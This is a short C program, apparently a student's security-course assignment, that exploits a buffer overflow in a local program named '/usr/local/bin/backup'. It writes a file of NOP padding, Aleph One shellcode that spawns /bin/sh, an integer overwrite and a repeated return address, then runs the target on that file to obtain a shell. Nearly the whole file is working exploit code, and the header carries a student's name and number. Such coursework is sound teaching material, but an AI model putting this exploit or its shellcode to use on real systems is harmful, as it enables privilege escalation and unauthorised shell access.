/*
 * Author: Lawson Fulton
 * Student#: 20381453
 * ID: ljfulton
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/backup"

#define DEFAULT_OFFSET                  10
#define DEFAULT_BUFFER_SIZE            3072
#define NOP                            0x90

/*
 * Aleph One shellcode.
 */
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

void write_sploit_file(char *filename)
{
  FILE *fp;
  int buffer_size = DEFAULT_BUFFER_SIZE;
  int shellcode_size = sizeof(shellcode) - 1;
  unsigned int addr = 0xffbfd1f0;
  int i_val = 3072;
  int i = 0;

  fp = fopen(filename,"w");

  /*Pad with NOPs*/
  for(i = 0; i < buffer_size - shellcode_size; i++) {
    putc(NOP,fp);
  }

  /*Shellcode goes right at the end of the buffer*/
  fputs(shellcode,fp);

  /*Special case for int i; in backup*/
  fwrite(&i_val, 4, 1, fp);

  /*Write the address of the buffer over the FP*/
  for(i = 0; i < DEFAULT_OFFSET; i++) {
    fwrite(&addr, 4, 1, fp);
  }

  fclose(fp);
}

int main(void)
{
  char filename[] = "foo";

  write_sploit_file(filename);

  system("/usr/local/bin/backup backup foo");

  remove(filename);
  exit(0);
}
